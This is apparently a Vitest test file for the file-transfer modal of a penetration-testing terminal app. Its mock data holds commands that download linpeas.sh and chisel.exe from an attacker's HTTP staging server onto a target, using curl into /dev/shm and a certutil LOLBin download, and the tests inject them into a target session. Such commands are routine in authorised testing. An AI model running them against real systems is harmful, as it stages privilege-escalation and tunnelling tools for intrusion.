import { describe, it, expect, vi, beforeEach } from 'vitest';
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { FileTransferModal } from './FileTransferModal';
import {
  FileTransferServerInfo,
  HostedFileEntry,
  NetworkInterfaceIP,
  FileTransferCommandSet,
} from '../types/fileTransfer';

describe('FileTransferModal (F-31 File Transfer Helper)', () => {
  const mockIPs: NetworkInterfaceIP[] = [
    { interface: 'tun0', ip: '10.10.14.42', cidr: '10.10.14.42/23', isVpn: true },
    { interface: 'eth0', ip: '192.168.1.50', cidr: '192.168.1.50/24', isVpn: false },
  ];

  const mockFiles: HostedFileEntry[] = [
    {
      name: 'linpeas.sh',
      relPath: 'linpeas.sh',
      fullPath: '/opt/tools/linpeas.sh',
      size: 845120,
      isDir: false,
      modTime: '2026-11-15T19:00:00Z',
    },
    {
      name: 'chisel.exe',
      relPath: 'chisel.exe',
      fullPath: '/opt/tools/chisel.exe',
      size: 4194304,
      isDir: false,
      modTime: '2026-11-15T19:00:00Z',
    },
  ];

  const mockCommandSet = (filename: string, sha256?: string): FileTransferCommandSet => ({
    filename,
    url: `http://10.10.14.42:8000/${filename}`,
    localIp: '10.10.14.42',
    port: 8000,
    sha256,
    methods: [
      {
        id: 'linux-curl',
        tool: 'curl',
        title: 'Linux // curl Download to Disk',
        targetOs: 'linux',
        category: 'download',
        command: `curl -fsSL "http://10.10.14.42:8000/${filename}" -o "/dev/shm/${filename}"`,
        notes: 'Stores in /dev/shm',
      },
      {
        id: 'win-certutil',
        tool: 'certutil.exe',
        title: 'Windows // certutil LOLBin Download',
        targetOs: 'windows',
        category: 'download',
        command: `certutil.exe -urlcache -split -f "http://10.10.14.42:8000/${filename}" "C:\\Users\\Public\\${filename}"`,
        notes: 'LOLBin download',
      },
      {
        id: 'linux-verify-sha256',
        tool: 'sha256sum',
        title: 'Linux // Verify SHA-256 Integrity',
        targetOs: 'linux',
        category: 'verify',
        command: sha256
          ? `echo "${sha256}  /dev/shm/${filename}" | sha256sum -c -`
          : `sha256sum "/dev/shm/${filename}"`,
        notes: 'Verify digest',
      },
    ],
    opsecWarnings: ['Cleartext HTTP transfer'],
  });

  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('loads local IPs, lists staged files, computes SHA-256/MD5 hashes, and updates verification commands (F-31)', async () => {
    const hashFileMock = vi.fn().mockResolvedValue({
      ...mockFiles[0],
      sha256: 'deadbeef00112233445566778899aabbccddeeff00112233445566778899aabb',
      md5: '0123456789abcdef0123456789abcdef',
    });

    const generateCommandsMock = vi.fn().mockImplementation((opts) => {
      return Promise.resolve(mockCommandSet(opts.filename, opts.sha256));
    });

    render(
      <FileTransferModal
        onClose={vi.fn()}
        activeSessionId="ssh-1"
        onSendToTerminal={vi.fn()}
        getDefaultDir={async () => '/opt/tools'}
        getLocalIPs={async () => mockIPs}
        listServers={async () => []}
        startServer={vi.fn()}
        stopServer={vi.fn()}
        generateServerCommand={async () => 'python3 -m http.server 8000 --directory "/opt/tools"'}
        listFiles={async () => mockFiles}
        hashFile={hashFileMock}
        generateCommands={generateCommandsMock}
      />
    );

    expect(await screen.findByText(/tun0: 10.10.14.42 \[VPN\]/i)).toBeInTheDocument();
    expect(await screen.findByText('linpeas.sh')).toBeInTheDocument();
    expect(screen.getByText('chisel.exe')).toBeInTheDocument();

    // Click staged file to select and hash it
    fireEvent.click(screen.getByText('linpeas.sh'));

    await waitFor(() => {
      expect(hashFileMock).toHaveBeenCalledWith('/opt/tools', 'linpeas.sh');
    });

    expect(
      await screen.findByText(/SHA256: deadbeef00112233445566778899aabbccddeeff00112233445566778899aabb/i)
    ).toBeInTheDocument();
    expect(
      screen.getByText(/MD5: 0123456789abcdef0123456789abcdef/i)
    ).toBeInTheDocument();

    expect(
      await screen.findByText(/certutil\.exe -urlcache -split -f "http:\/\/10\.10\.14\.42:8000\/linpeas\.sh"/i)
    ).toBeInTheDocument();
  });

  it('starts and stops the native Go HTTP staging server and injects target commands into active terminal (F-31)', async () => {
    let runningServers: FileTransferServerInfo[] = [];

    const startServerMock = vi.fn().mockImplementation(async (cfg) => {
      const started: FileTransferServerInfo = {
        id: 'ftsrv-8000-abc',
        name: cfg.name,
        kind: 'builtin',
        directory: cfg.directory,
        bindAddress: cfg.bindAddress,
        port: cfg.port,
        enableUpload: cfg.enableUpload,
        useTLS: false,
        hasBasicAuth: false,
        status: 'running',
        servedCount: 0,
        uploadCount: 0,
        commandPreview: '[Built-in]',
      };
      runningServers = [started];
      return started;
    });

    const stopServerMock = vi.fn().mockImplementation(async () => {
      runningServers = [];
    });

    const onSendToTerminalMock = vi.fn();

    render(
      <FileTransferModal
        onClose={vi.fn()}
        activeSessionId="sess-target-1"
        onSendToTerminal={onSendToTerminalMock}
        getDefaultDir={async () => '/opt/tools'}
        getLocalIPs={async () => mockIPs}
        listServers={async () => runningServers}
        startServer={startServerMock}
        stopServer={stopServerMock}
        generateServerCommand={async (cfg) => `python3 -m http.server ${cfg.port}`}
        listFiles={async () => mockFiles}
        hashFile={vi.fn()}
        generateCommands={async (opts) => mockCommandSet(opts.filename, opts.sha256)}
      />
    );

    const startBtn = await screen.findByRole('button', { name: /Start Native HTTP Server \(:8000\)/i });
    fireEvent.click(startBtn);

    await waitFor(() => {
      expect(startServerMock).toHaveBeenCalledTimes(1);
    });

    expect(await screen.findByText(/RUNNING HTTP STAGING SERVERS \(1\)/i)).toBeInTheDocument();

    // Inject generated command into active terminal
    const insertBtns = await screen.findAllByRole('button', { name: /^Insert$/i });
    fireEvent.click(insertBtns[0]);
    expect(onSendToTerminalMock).toHaveBeenCalledWith(
      'sess-target-1',
      expect.stringContaining('curl -fsSL "http://10.10.14.42:8000/linpeas.sh"')
    );

    // Stop server
    const stopBtn = screen.getByRole('button', { name: /^Stop$/i });
    fireEvent.click(stopBtn);
    await waitFor(() => {
      expect(stopServerMock).toHaveBeenCalledWith('ftsrv-8000-abc');
    });
  });
});
